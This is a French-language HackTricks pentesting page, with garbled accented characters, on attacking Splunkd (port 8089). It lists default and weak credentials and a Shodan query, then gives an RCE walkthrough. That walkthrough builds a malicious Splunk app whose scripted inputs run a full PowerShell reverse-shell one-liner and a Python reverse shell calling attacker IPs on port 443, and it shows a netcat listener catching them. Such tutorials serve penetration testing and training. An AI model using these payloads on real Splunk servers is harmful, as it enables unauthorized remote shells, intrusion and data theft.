# 8089 - Pentesting Splunkd

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Informations de base**

Splunk est un **outil d'analyse de journaux** qui joue un r√¥le crucial dans **la collecte, l'analyse et la visualisation des donn√©es**. Bien que son objectif initial n'√©tait pas de servir d'outil **SIEM (Gestion des informations et des √©v√©nements de s√©curit√©)**, il a gagn√© en popularit√© dans le domaine de **la surveillance de la s√©curit√©** et de **l'analyse commerciale**.

Les d√©ploiements de Splunk sont fr√©quemment utilis√©s pour stocker des **donn√©es sensibles** et peuvent servir de **source d'information pr√©cieuse** pour les attaquants potentiels s'ils parviennent √† compromettre le syst√®me. **Port par d√©faut :** 8089
```
PORT     STATE SERVICE VERSION
8089/tcp open  http    Splunkd httpd
```
{% hint style="info" %}
Le **serveur web Splunk fonctionne par d√©faut sur le port 8000**.
{% endhint %}

## √ânum√©ration

### Version Gratuite

L'essai de Splunk Enterprise se transforme en une **version gratuite apr√®s 60 jours**, qui **ne n√©cessite pas d'authentification**. Il n'est pas rare que les administrateurs syst√®me installent un essai de Splunk pour le tester, qui est **ensuite oubli√©**. Cela se convertira automatiquement en la version gratuite qui n'a aucune forme d'authentification, introduisant une faille de s√©curit√© dans l'environnement. Certaines organisations peuvent opter pour la version gratuite en raison de contraintes budg√©taires, sans comprendre pleinement les implications de l'absence de gestion des utilisateurs/roles.

### Identifiants par D√©faut

Sur les anciennes versions de Splunk, les identifiants par d√©faut sont **`admin:changeme`**, qui sont affich√©s de mani√®re pratique sur la page de connexion.\
Cependant, **la derni√®re version de Splunk** d√©finit **les identifiants** **durant le processus d'installation**. Si les identifiants par d√©faut ne fonctionnent pas, il vaut la peine de v√©rifier des mots de passe faibles courants tels que `admin`, `Welcome`, `Welcome1`, `Password123`, etc.

### Obtenir des Informations

Une fois connect√© √† Splunk, nous pouvons **parcourir les donn√©es,** ex√©cuter des **rapports**, cr√©er des **tableaux de bord**, **installer des applications** depuis la biblioth√®que Splunkbase, et installer des applications personnalis√©es.\
Vous pouvez √©galement ex√©cuter du code : Splunk a plusieurs fa√ßons d'**ex√©cuter du code**, telles que des applications Django c√¥t√© serveur, des points de terminaison REST, des entr√©es script√©es et des scripts d'alerte. Une m√©thode courante pour obtenir une ex√©cution de code √† distance sur un serveur Splunk est l'utilisation d'une entr√©e script√©e.

De plus, comme Splunk peut √™tre install√© sur des h√¥tes Windows ou Linux, des entr√©es script√©es peuvent √™tre cr√©√©es pour ex√©cuter des scripts Bash, PowerShell ou Batch.

### Shodan

* `Splunk build`

## RCE

### Cr√©er une Application Personnalis√©e

Une application personnalis√©e peut ex√©cuter des **scripts Python, Batch, Bash ou PowerShell**.\
Notez que **Splunk est livr√© avec Python install√©**, donc m√™me sur des syst√®mes **Windows**, vous pourrez ex√©cuter du code python.

Vous pouvez utiliser [**ceci**](https://github.com/0xjpuff/reverse\_shell\_splunk) paquet Splunk pour nous aider. Le r√©pertoire **`bin`** dans ce d√©p√¥t contient des exemples pour [Python](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/rev.py) et [PowerShell](https://github.com/0xjpuff/reverse\_shell\_splunk/blob/master/reverse\_shell\_splunk/bin/run.ps1). Passons en revue cela √©tape par √©tape.

Pour y parvenir, nous devons d'abord cr√©er une application Splunk personnalis√©e en utilisant la structure de r√©pertoire suivante :
```shell-session
tree splunk_shell/

splunk_shell/
‚îú‚îÄ‚îÄ bin
‚îî‚îÄ‚îÄ default
```
Le **`bin`** r√©pertoire contiendra tous les **scripts que nous avons l'intention d'ex√©cuter** (dans ce cas, un **PowerShell** reverse shell), et le r√©pertoire par d√©faut aura notre fichier `inputs.conf`. Notre reverse shell sera un **PowerShell one-liner :**
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close(
```
Le fichier [inputs.conf](https://docs.splunk.com/Documentation/Splunk/latest/Admin/Inputsconf) indique √† Splunk **quel script ex√©cuter** et d'autres conditions. Ici, nous d√©finissons l'application comme activ√©e et disons √† Splunk d'ex√©cuter le script toutes les 10 secondes. L'intervalle est toujours en secondes, et l'entr√©e (script) ne s'ex√©cutera que si ce param√®tre est pr√©sent.
```shell-session
cat inputs.conf

[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = shell

[script://.\bin\run.bat]
disabled = 0
sourcetype = shell
interval = 10
```
Nous avons besoin du fichier `.bat`, qui s'ex√©cutera lorsque l'application sera d√©ploy√©e et ex√©cutera la ligne de commande PowerShell.

L'√©tape suivante consiste √† choisir `Install app from file` et √† t√©l√©charger l'application.

<figure><img src="../.gitbook/assets/image (668).png" alt=""><figcaption></figcaption></figure>

Avant de t√©l√©charger l'application personnalis√©e malveillante, commen√ßons un √©couteur en utilisant Netcat ou [socat](https://linux.die.net/man/1/socat).
```shell-session
sudo nc -lnvp 443

listening on [any] 443 ...
```
Sur la page `Upload app`, cliquez sur parcourir, choisissez le tarball que nous avons cr√©√© pr√©c√©demment et cliquez sur `Upload`. D√®s que nous t√©l√©chargeons l'application, un **reverse shell est re√ßu** car le statut de l'application sera automatiquement chang√© en `Enabled`.

#### Linux

Si nous traitions avec un **h√¥te Linux**, nous devrions **modifier le script Python `rev.py`** avant de cr√©er le tarball et de t√©l√©charger l'application malveillante personnalis√©e. Le reste du processus serait le m√™me, et nous obtiendrions une connexion reverse shell sur notre √©couteur Netcat et serions partis.
```python
import sys,socket,os,pty

ip="10.10.14.15"
port="443"
s=socket.socket()
s.connect((ip,int(port)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')
```
### RCE & Escalade de Privil√®ges

Dans la page suivante, vous pouvez trouver une explication sur la fa√ßon dont ce service peut √™tre abus√© pour escalader les privil√®ges et obtenir une persistance :

{% content-ref url="../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md" %}
[splunk-lpe-and-persistence.md](../linux-hardening/privilege-escalation/splunk-lpe-and-persistence.md)
{% endcontent-ref %}

## R√©f√©rences

* [https://academy.hackthebox.com/module/113/section/1213](https://academy.hackthebox.com/module/113/section/1213)

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
